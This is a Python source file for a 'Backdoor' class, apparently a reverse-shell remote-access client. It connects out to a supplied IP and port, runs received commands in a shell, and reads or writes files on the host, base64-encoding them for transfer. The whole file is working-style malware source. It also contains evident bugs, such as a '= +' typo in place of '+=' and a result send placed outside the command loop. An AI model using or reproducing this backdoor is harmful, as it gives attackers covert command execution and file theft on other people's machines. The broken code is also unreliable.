
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send("[+] Connection has been established!")

    def reliable_send(self, data):
        """This method 'compress in a package' the information to be sent without loss of data"""
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        """This method 'uncompress the package' with the information received without loss of data"""
        json_data = b""
        while True:
            try:
                json_data = + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_directory(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
        
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful." 

    def run(self):
        try: 
                
            while True:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "download":
                    command_result  = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result  = self.write_file(command[1], command [2])
    
                else:
                    # Data is captured in command_result ready to be sent
                    command_result = self.execute_system_command(command).decode()
        except Exception as e:
            command_result = "[-] Error during command execution."

        self.reliable_send(command_result)


# my_backdoor = Backdoor(ip, port)
# my_backdoor.run()
